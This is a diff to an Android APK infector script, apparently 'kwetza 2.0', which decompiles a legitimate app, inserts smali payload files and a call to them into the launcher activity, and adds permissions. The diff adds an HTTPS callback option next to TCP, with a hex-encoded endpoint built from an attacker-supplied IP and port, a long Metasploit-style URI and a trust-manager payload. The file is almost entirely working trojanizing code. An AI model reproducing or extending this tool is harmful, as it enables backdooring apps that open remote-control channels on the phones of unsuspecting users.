@@ -7,14 +7,29 @@ from bs4 import BeautifulSoup as Soup
 activityToTarget=""
 targetFolder=""
 endpointIP=""
-endpintPort=""
+endpointPort=""
 hexEndpoint=""
 facepalm=""
 cwd=""
+httpsComms=0
 
-def byteTheComms():
-	print "[*] BYTING COMMS..."
-	totalEndpointPlain="ZZZZtcp://"+endpointIP+":"+endpintPort
+def byteTheTCPComms():
+	print "[*] BYTING TCP COMMS"
+	totalEndpointPlain="ZZZZtcp://"+endpointIP+":"+endpointPort
+	endpointLength=len(totalEndpointPlain)
+	global facepalm
+	global httpsComms
+	httpsComms=0
+	facepalm=hex(endpointLength)
+	global hexEndpoint
+	for val in totalEndpointPlain:
+		hexEndpoint+=hex(ord(val))+"\n\t\t"
+
+def byteTheHTTPSComms():
+	print "[*] BYTING HTTPS COMMS"
+	global httpsComms
+	httpsComms=1
+	totalEndpointPlain="ZZZZhttps://"+endpointIP+":"+endpointPort+"/qFTHTkSl1FhadlllA0gBcg882wlHLDmhMn6j1_ykMcArMkXkE-KOQ3RV-W7JtI5nf7x65a3fwcwgLEPvnCgmeb2f0m-VVEm_qAMZzFhGdNn8F46OtF_FJAP1b1AjG5x8X-GGH-rekgabzOzEMkQkgqYuUl"
 	endpointLength=len(totalEndpointPlain)
 	global facepalm
 	facepalm=hex(endpointLength)
@@ -28,14 +43,14 @@ def initialize():
 	p = subprocess.Popen(command, stdout=subprocess.PIPE)
 	theResult = p.communicate()[0]
 
-	global endpintPort
+	global endpointPort
 	global endpointIP
-	endpointIP=sys.argv[2]
-	endpintPort=sys.argv[3]
+	endpointIP=sys.argv[3]
+	endpointPort=sys.argv[4]
 	global cwd
 
 	print "[+] ENDPOINT IP: "+endpointIP
-	print "[+] ENDPOINT PORT: "+endpintPort
+	print "[+] ENDPOINT PORT: "+endpointPort
 
 	#CHECK IF APKTOOL IS INSTALLED
 	if "2." not in theResult:
@@ -59,10 +74,11 @@ def initialize():
 	global targetFolder
 	targetFolder=cwd+"/"+outputFolderName[:intPoss]
 
-def parseAndroidManifext():
+def parseAndroidManifest():
 	print "[*] ANALYZING ANDROID MANIFEST"
 	global targetFolder
 	file = targetFolder+"/AndroidManifest.xml"
+
 	handler = open(file).read()
 	soup = Soup(handler,"lxml")
 	activities= soup.find_all('activity-alias')
@@ -77,7 +93,7 @@ def parseAndroidManifext():
 			elif "android:name" in str(activity).lower():
 				activityToTarget= str(activity['android:name'])
 			else:
-				print "[+] ERROR IDENTIFYING ACTIVITY"
+				print "[+] ERROR IDENTIFYING TARGET ACTIVITY"
 
 	if foundLAUNCHER==1:
 		print "[+] TARGET ACTIVIY: "+activityToTarget
@@ -85,41 +101,85 @@ def parseAndroidManifext():
 		print "[+] NO LAUNCHER FOUND!!!!!"
 
 def readPayloads():
+	print "[*] PREPARING PAYLOADS"
 	global cwd
-	pathToPalyoad1=cwd+"/"+"payload/AssistActivity1.smali"
-	pathToPalyoad12=cwd+"/"+"payload/AssistActivity.smali"
-	contentsOfFile1 = open(pathToPalyoad1).read()
-	contentsOfFile2 = open(pathToPalyoad12).read()
-	inject="L"+activityToTarget.replace('.','/')
-	intPackagePos=inject.rfind('/')
-	preppedContents1= contentsOfFile1.replace('PLACEHOLDER',inject[:intPackagePos])
-	preppedContents2= contentsOfFile2.replace('PLACEHOLDER',inject[:intPackagePos])
-	#inject the tcp endpoint here
-	preppedContents2= preppedContents2.replace('FACEPALM',facepalm)
-	preppedContents2= preppedContents2.replace('BEARDEDGREATNESS',hexEndpoint)
-	targetDirectory=targetFolder+"/smali/"+activityToTarget.replace('.','/')
-	targetDirectory=targetDirectory[:targetDirectory.rfind('/')]
 
-	assist1File = open(targetDirectory+"/AssistActivity1.smali", "w")
-	assist1File.write(preppedContents1)
-	assist1File.close()
+	if httpsComms==1:
+		pathToPalyoad1=cwd+"/"+"payload/HttpsActivity1.smali"
+		pathToPalyoad2=cwd+"/"+"payload/HttpsActivity.smali"
+		pathToPalyoad3=cwd+"/"+"payload/PayloadTrustManager.smali"
+		contentsOfFile1 = open(pathToPalyoad1).read()
+		contentsOfFile2 = open(pathToPalyoad2).read()
+		contentsOfFile3 = open(pathToPalyoad3).read()
 
-	assist2File = open(targetDirectory+"/AssistActivity.smali", "w")
-	assist2File.write(preppedContents2)
-	assist2File.close()
+		inject="L"+activityToTarget.replace('.','/')
+		intPackagePos=inject.rfind('/')
+		preppedContents1= contentsOfFile1.replace('PLACEHOLDER',inject[:intPackagePos])
+		preppedContents2= contentsOfFile2.replace('PLACEHOLDER',inject[:intPackagePos])
+		preppedContents3= contentsOfFile3.replace('PLACEHOLDER',inject[:intPackagePos])
 
-	pathToFile=targetFolder+"/smali/"+activityToTarget.replace('.','/')+'.smali'
-	stringContentsOfTargetActivity=""
-	stringContentsOfTargetActivity = open(pathToFile).read()
+		#inject the tcp endpoint here
+		preppedContents2=preppedContents2.replace('IP_ADDR',endpointIP)
+		preppedContents2= preppedContents2.replace('END_PORT',endpointPort)
+
+		targetDirectory=targetFolder+"/smali/"+activityToTarget.replace('.','/')
+		targetDirectory=targetDirectory[:targetDirectory.rfind('/')]
+
+		assist1File = open(targetDirectory+"/HttpsActivity1.smali", "w")
+		assist1File.write(preppedContents1)
+		assist1File.close()
+
+		assist2File = open(targetDirectory+"/HttpsActivity.smali", "w")
+		assist2File.write(preppedContents2)
+		assist2File.close()
+
+		assist3File = open(targetDirectory+"/PayloadTrustManager.smali", "w")
+		assist3File.write(preppedContents3)
+		assist3File.close()
+
+		pathToFile=targetFolder+"/smali/"+activityToTarget.replace('.','/')+'.smali'
+		stringContentsOfTargetActivity=""
+		stringContentsOfTargetActivity = open(pathToFile).read()
+	else:
+		pathToPalyoad1=cwd+"/"+"payload/AssistActivity1.smali"
+		pathToPalyoad12=cwd+"/"+"payload/AssistActivity.smali"
+		contentsOfFile1 = open(pathToPalyoad1).read()
+		contentsOfFile2 = open(pathToPalyoad12).read()
+		inject="L"+activityToTarget.replace('.','/')
+		intPackagePos=inject.rfind('/')
+		preppedContents1= contentsOfFile1.replace('PLACEHOLDER',inject[:intPackagePos])
+		preppedContents2= contentsOfFile2.replace('PLACEHOLDER',inject[:intPackagePos])
+		#inject the tcp endpoint here
+		preppedContents2= preppedContents2.replace('FACEPALM',facepalm)
+		preppedContents2= preppedContents2.replace('BEARDEDGREATNESS',hexEndpoint)
+		targetDirectory=targetFolder+"/smali/"+activityToTarget.replace('.','/')
+		targetDirectory=targetDirectory[:targetDirectory.rfind('/')]
+
+		assist1File = open(targetDirectory+"/AssistActivity1.smali", "w")
+		assist1File.write(preppedContents1)
+		assist1File.close()
+
+		assist2File = open(targetDirectory+"/AssistActivity.smali", "w")
+		assist2File.write(preppedContents2)
+		assist2File.close()
+
+		pathToFile=targetFolder+"/smali/"+activityToTarget.replace('.','/')+'.smali'
+		stringContentsOfTargetActivity=""
+		stringContentsOfTargetActivity = open(pathToFile).read()
 
 def injectIntoActivity():
-	print "[*] INJECTING INTO APK..."
+	print "[*] INJECTING INTO APK"
 	global targetFolder
 	checkStrings=['create','method']
+	stringInvokePayload=""
 
 	pathToFile=targetFolder+"/smali/"+activityToTarget.replace('.','/')+'.smali'
+	if httpsComms==1:
+		stringInvokePayload='\ninvoke-static {p0}, INJECT/HttpsActivity;->start(Landroid/content/Context;)V\n'
+	else:
+		stringInvokePayload='\ninvoke-static {p0}, INJECT/AssistActivity;->doThis(Landroid/content/Context;)V\n'
+
 	#NOW WE NEED TO INJECT THE CALLING CODE INTO THE TARGET ACTIVITY
-	stringInvokePayload='\ninvoke-static {p0}, INJECT/AssistActivity;->doThis(Landroid/content/Context;)V\n'
 	inject="L"+activityToTarget.replace('.','/')
 	intPackagePos=inject.rfind('/')
 	stringPackageToInject=inject[:intPackagePos]
@@ -131,7 +191,7 @@ def injectIntoActivity():
 		if all(x in line.lower() for x in checkStrings):
 			stringDataToWriteIntoNewActivity+=stringInvokePayload
 			f.close()
-	pathToFile=targetFolder+"/smali/"+activityToTarget.replace('.','/')+'.smali'
+	# pathToFile=targetFolder+"/smali/"+activityToTarget.replace('.','/')+'.smali'
 	newInjectFile = open(pathToFile, "w")
 	newInjectFile.write(stringDataToWriteIntoNewActivity)
 	newInjectFile.close()
@@ -208,36 +268,50 @@ def injectCrazyPermissions():
 
 
 if __name__ == "__main__":
-	print "[+] MMMMMMMM KWETZA";
+	print "                                           _                  _              ___    ___  "
+	print "                                          | |                | |            |__ \  / _ \ "
+	print " _ __ ___  _ __ ___  _ __ ___  _ __ ___   | | ____      _____| |_ ______ _     ) || | | |"
+	print "| '_ ` _ \| '_ ` _ \| '_ ` _ \| '_ ` _ \  | |/ /\ \ /\ / / _ \ __|_  / _` |   / / | | | |"
+	print "| | | | | | | | | | | | | | | | | | | | | |   <  \ V  V /  __/ |_ / / (_| |  / /_ | |_| |"
+	print "|_| |_| |_|_| |_| |_|_| |_| |_|_| |_| |_| |_|\_\  \_/\_/ \___|\__/___\__,_| |____(_)___/ "
+	print ""
 	try:
 		initialize()
 	except Exception as e:
 		print "!!!! ERROR IN 'initialize' method"
 		print str(e)
+		print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
 		sys.exit()
 	try:
-		byteTheComms()
+		if "https" in sys.argv[2]:
+			byteTheHTTPSComms()
+		else:
+			byteTheTCPComms()
 	except Exception as e:
 		print "!!! ERROR IN 'byteTheComms' method"
 		print str(e)
+		print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
 		sys.exit()
 	try:
-		parseAndroidManifext()
+		parseAndroidManifest()
 	except Exception as e:
-		print "!!! ERROR IN 'parseAndroidManifext' method"
+		print "!!! ERROR IN 'parseAndroidManifest' method"
 		print str(e)
+		print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
 		sys.exit()
 	try:
 		readPayloads()
 	except Exception as e:
 		print "!!! ERROR IN 'readPayloads' method"
 		print str(e)
+		print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
 		sys.exit()
 	try:
 		injectIntoActivity()
 	except Exception as e:
 		print "!!! ERROR IN 'injectIntoActivity' method"
 		print str(e)
+		print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
 		sys.exit()
 	try:
 		injectCrazyPermissions()
